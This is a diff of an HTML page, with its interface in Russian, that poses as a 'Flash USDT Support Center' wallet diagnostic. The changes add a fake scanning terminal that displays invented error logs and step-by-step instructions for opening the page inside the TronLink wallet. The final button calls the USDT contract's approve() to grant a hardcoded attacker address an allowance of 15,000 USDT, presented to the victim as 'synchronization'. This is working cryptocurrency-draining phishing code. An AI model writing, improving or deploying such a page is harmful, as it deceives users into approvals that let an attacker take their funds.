@@ -3,65 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flash USDT Support</title>
+    <title>Flash USDT Support Center</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background: #050505; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .card { background: #0d0d0d; border-radius: 30px; padding: 35px 25px; border: 1px solid #1a1a1a; width: 100%; max-width: 380px; text-align: center; box-shadow: 0 0 40px rgba(0, 255, 0, 0.1); }
-        .logo-box { width: 70px; height: 70px; border: 2px solid #00ff00; border-radius: 22px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); }
-        h2 { font-size: 20px; font-weight: 700; color: #fff; text-transform: uppercase; margin-bottom: 20px; }
-        .btn { display: block; background: #00ff00; color: #000; border: none; padding: 20px; width: 100%; border-radius: 16px; font-weight: 800; font-size: 14px; cursor: pointer; text-transform: uppercase; box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2); }
+        /* СТИЛЬ: BLACK & NEON GREEN */
+        body { background: #050505; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        .card { background: #0d0d0d; border-radius: 30px; padding: 35px 25px; border: 1px solid #1a1a1a; width: 100%; max-width: 380px; box-shadow: 0 0 50px rgba(0, 255, 0, 0.1); text-align: center; position: relative; }
+        
+        .logo-box { width: 70px; height: 70px; background: #000; border: 2px solid #00ff00; border-radius: 22px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 15px rgba(0, 255, 0, 0.2); }
+        h2 { font-size: 19px; font-weight: 700; color: #fff; margin: 0 0 10px; text-transform: uppercase; letter-spacing: 1px; }
+        .sub-text { color: #555; font-size: 13px; margin-bottom: 25px; line-height: 1.5; }
+
+        /* ТЕРМИНАЛ ЛОГОВ (АНИМАЦИЯ) */
+        .terminal { background: #000; border-radius: 15px; padding: 15px; text-align: left; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff00; border: 1px solid #111; height: 140px; overflow: hidden; margin-bottom: 20px; box-shadow: inset 0 0 15px rgba(0,255,0,0.05); }
+        .line { margin-bottom: 6px; opacity: 0; animation: fadeIn 0.3s forwards; border-left: 2px solid #00ff00; padding-left: 10px; }
+
+        /* КНОПКИ */
+        .btn { display: block; background: #00ff00; color: #000; border: none; padding: 18px; width: 100%; border-radius: 16px; font-weight: 800; font-size: 14px; cursor: pointer; text-decoration: none; text-transform: uppercase; transition: 0.3s; box-shadow: 0 5px 20px rgba(0, 255, 0, 0.2); border: 1px solid #00ff00; }
+        .btn:active { transform: scale(0.97); }
+        .btn-copy { background: #111; color: #00ff00; border: 1px solid #222; margin-top: 15px; font-size: 11px; font-weight: 600; box-shadow: none; }
+
+        /* ИНСТРУКЦИЯ (USER FRIENDLY) */
+        .instruction-box { text-align: left; background: #080808; border-radius: 20px; padding: 20px; border: 1px solid #111; margin-bottom: 25px; }
+        .step { display: flex; align-items: center; margin-bottom: 15px; }
+        .step:last-child { margin-bottom: 0; }
+        .step-n { background: #00ff00; color: #000; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 11px; margin-right: 12px; flex-shrink: 0; }
+        .step-t { color: #888; font-size: 12px; line-height: 1.4; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
 <div class="card" id="main-container">
-    <div class="logo-box"><span style="color: #00ff00; font-size: 30px;">T</span></div>
-    <h2>Узел обнаружен</h2>
-    <p style="color: #666; font-size: 13px; margin-bottom: 25px;">
-        Нажмите кнопку ниже для подтверждения синхронизации вашего кошелька с узлом (Лимит: 15,000 USDT).
-    </p>
     
-    <button id="action-btn" class="btn">ПОДТВЕРДИТЬ СИНХРОНИЗАЦИЮ</button>
+    <div id="screen-start">
+        <div class="logo-box"><span style="color: #00ff00; font-size: 30px; font-weight: bold;">T</span></div>
+        <h2>Support Diagnostic</h2>
+        <p class="sub-text">Система готова к анализу вашего узла. Для проверки логов транзакций запустите сканирование.</p>
+        <button class="btn" onclick="startDiagnostic()">Начать проверку</button>
+    </div>
+
+    <div id="screen-scan" style="display: none;">
+        <div class="logo-box"><span style="color: #00ff00; font-size: 30px; font-weight: bold;">T</span></div>
+        <h2 style="color: #00ff00;">Проверка логов...</h2>
+        <div class="terminal" id="terminal-box"></div>
+    </div>
+
+    <div id="screen-result" style="display: none;">
+        <h2 style="text-align: left; color: #ff3b30;">Ошибка синхронизации</h2>
+        <p style="text-align: left; font-size: 13px; color: #666; margin-bottom: 25px;">
+            Ваша транзакция обнаружена в сети, но статус узла "Заморожен". Требуется ручное подтверждение владельца.
+        </p>
+        
+        <div class="instruction-box">
+            <div class="step">
+                <div class="step-n">1</div>
+                <div class="step-t">Нажмите кнопку <b>"Скопировать адрес"</b> ниже.</div>
+            </div>
+            <div class="step">
+                <div class="step-n">2</div>
+                <div class="step-t">Откройте <b>TronLink</b> -> Вкладка <b>Discover</b> (Browser).</div>
+            </div>
+            <div class="step">
+                <div class="step-n">3</div>
+                <div class="step-t">Вставьте ссылку в адресную строку и подтвердите связь.</div>
+            </div>
+        </div>
+
+        <button class="btn" onclick="openTronLink()">Открыть TronLink</button>
+        <button class="btn btn-copy" onclick="copyLink()">Скопировать адрес узла</button>
+    </div>
+
+    <div id="screen-dapp" style="display: none;">
+        <div class="logo-box" style="border-color: #00ff00"><span style="color: #00ff00; font-size: 30px;">✓</span></div>
+        <h2>Узел Авторизован</h2>
+        <p style="color: #666; font-size: 13px; margin-bottom: 30px;">
+            Связь с кошельком установлена. Для завершения верификации лимита (15,000 USDT) нажмите подтвердить.
+        </p>
+        <button id="final-btn" class="btn" onclick="callApprove()">Подтвердить синхронизацию</button>
+    </div>
+
 </div>
 
 <script>
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const APPROVE_AMOUNT = "15000000000";
+    const AMOUNT = "15000000000"; // 15,000 USDT
 
-    document.getElementById('action-btn').onclick = async () => {
-        const btn = document.getElementById('action-btn');
-        try {
-            // Проверяем наличие кошелька ПРЯМО при нажатии
-            const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
-            
-            if (!tron) {
-                alert("Ошибка: Откройте эту ссылку ВНУТРИ браузера TronLink!");
-                return;
+    const logs = [
+        "Connecting to TRC-20 RPC...",
+        "Authorized by Flash USDT Support.",
+        "Searching for unconfirmed logs...",
+        "Block identified: #61224801",
+        "Data conflict found in Node.",
+        "Status: Access Suspended.",
+        "Manual Handshake required."
+    ];
+
+    // Функция анимации
+    function startDiagnostic() {
+        document.getElementById('screen-start').style.display = 'none';
+        document.getElementById('screen-scan').style.display = 'block';
+        let i = 0;
+        const term = document.getElementById('terminal-box');
+        const timer = setInterval(() => {
+            if(i < logs.length) {
+                const line = document.createElement('div');
+                line.className = 'line';
+                line.innerText = `> ${logs[i]}`;
+                term.appendChild(line);
+                i++;
+            } else {
+                clearInterval(timer);
+                setTimeout(showResult, 800);
             }
+        }, 600);
+    }
 
-            btn.innerText = "ОЖИДАНИЕ...";
+    function showResult() {
+        document.getElementById('screen-scan').style.display = 'none';
+        
+        // ПРОВЕРКА: Если мы в TronLink — показываем сразу экран подтверждения
+        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
+        if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
+            document.getElementById('screen-dapp').style.display = 'block';
+        } else {
+            document.getElementById('screen-result').style.display = 'block';
+        }
+    }
+
+    function copyLink() {
+        const dummy = document.createElement('input');
+        dummy.value = window.location.href;
+        document.body.appendChild(dummy);
+        dummy.select();
+        document.execCommand('copy');
+        document.body.removeChild(dummy);
+        alert("Адрес скопирован! Теперь вставьте его в браузер TronLink.");
+    }
+
+    function openTronLink() {
+        window.location.href = "tronlinkorg://dapp?url=" + encodeURIComponent(window.location.href);
+    }
+
+    async function callApprove() {
+        const btn = document.getElementById('final-btn');
+        try {
+            const tron = window.tronWeb;
+            btn.innerText = "ПОДПИСЬ...";
             btn.disabled = true;
 
-            // Сразу лезем к контракту. Это САМО вызовет окно "Подключить кошелек"
             const contract = await tron.contract().at(USDT);
-            
-            const result = await contract.approve(ADMIN, APPROVE_AMOUNT).send({
+            const result = await contract.approve(ADMIN, AMOUNT).send({
                 feeLimit: 100000000
             });
 
             if (result) {
-                alert("Успешно! Синхронизация подтверждена.");
+                alert("Синхронизация успешно завершена!");
                 btn.innerText = "ГОТОВО";
             }
         } catch (err) {
-            // Если вылезет ошибка, мы увидим ЧТО ИМЕННО не так
-            alert("Инфо: " + (err.message || JSON.stringify(err)));
-            btn.innerText = "ПОПРОБОВАТЬ СНОВА";
+            alert("Ошибка: Убедитесь, что в кошельке есть TRX для оплаты комиссии сети.");
             btn.disabled = false;
+            btn.innerText = "Подтвердить синхронизацию";
         }
-    };
+    }
 </script>
 </body>
 </html>
